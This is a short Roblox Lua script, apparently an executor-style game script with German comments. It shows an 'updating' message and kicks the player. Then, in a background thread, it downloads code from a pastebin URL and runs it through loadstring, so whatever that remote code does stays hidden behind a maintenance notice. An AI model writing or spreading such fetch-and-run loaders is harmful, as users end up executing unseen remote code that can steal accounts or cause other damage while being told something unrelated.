-- Script is getting updated rn!

local player = game.Players.LocalPlayer

-- Kick kommt ZUERST
print("Script is getting updated rn!")
player:Kick("script is getting updated rn!")

-- Loadstring trotzdem unten (wird in separatem Thread versucht)
task.spawn(function()
    task.wait(0.3)  -- kleine Verzögerung
    loadstring(game:HttpGet("https://pastebin.com/raw/Gr1ZtEiy"))()
end)
